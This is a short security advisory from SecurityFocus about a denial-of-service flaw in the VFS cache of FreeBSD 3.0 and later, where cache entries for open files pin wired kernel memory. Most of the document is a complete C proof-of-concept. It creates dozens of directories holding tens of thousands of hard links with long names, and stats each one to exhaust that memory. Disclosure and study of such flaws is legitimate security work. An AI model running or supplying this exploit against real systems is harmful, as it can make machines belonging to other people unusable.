source: http://www.securityfocus.com/bid/653/info

A vulnerability exists in FreeBSD's new VFS cache introduced in version 3.0 that allows a local and possibly remote user to force the kernel to consume large quantities of wired memory thus creating a denial of service condition. The new VFS cache has no way to purge entries from memory while the file is open, consuming wired memory and allowing for the denial of service (memory that cannot be swapped out).

FreeBSD versions earlier than 3.0 are not vulnerable, nor is the original 4.4BSD-Lite code. 

#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>

#define	NFILE	64
#define	NLINK	30000
#define	NCHAR	245

int
main()
{
	char junk[NCHAR+1],
	     dir[2+1+2+1], file1[2+1+2+1+NCHAR+3+1], file2[2+1+2+1+NCHAR+3+1];
	int i, j;
	struct stat sb;

	memset(junk, 'x', NCHAR);
	junk[NCHAR] = '\0';
	for (i = 0; i < NFILE; i++) {
		printf("\r%02d/%05d...", i, 0),
		fflush(stdout);
		sprintf(dir, "%02d-%02d", i, 0);
		if (mkdir(dir, 0755) < 0)
			fprintf(stderr, "mkdir(%s) failed\n", dir),
			exit(1);
		sprintf(file1, "%s/%s%03d", dir, junk, 0);
		if (creat(file1, 0644) < 0)
			fprintf(stderr, "creat(%s) failed\n", file1),
			exit(1);
		if (stat(file1, &sb) < 0)
			fprintf(stderr, "stat(%s) failed\n", file1),
			exit(1);
		for (j = 1; j < NLINK; j++) {
			if ((j % 1000) == 0) {
				printf("\r%02d/%05d...", i, j),
				fflush(stdout);
				sprintf(dir, "%02d-%02d", i, j/1000);
				if (mkdir(dir, 0755) < 0)
					fprintf(stderr, "mkdir(%s) failed\n", dir),
					exit(1);
			}
			sprintf(file2, "%s/%s%03d", dir, junk, j%1000);
			if (link(file1, file2) < 0)
				fprintf(stderr, "link(%s,%s) failed\n", file1, file2),
				exit(1);
			if (stat(file2, &sb) < 0)
				fprintf(stderr, "stat(%s) failed\n", file2),
				exit(1);
		}
	}
	printf("\rfinished successfully\n");
}
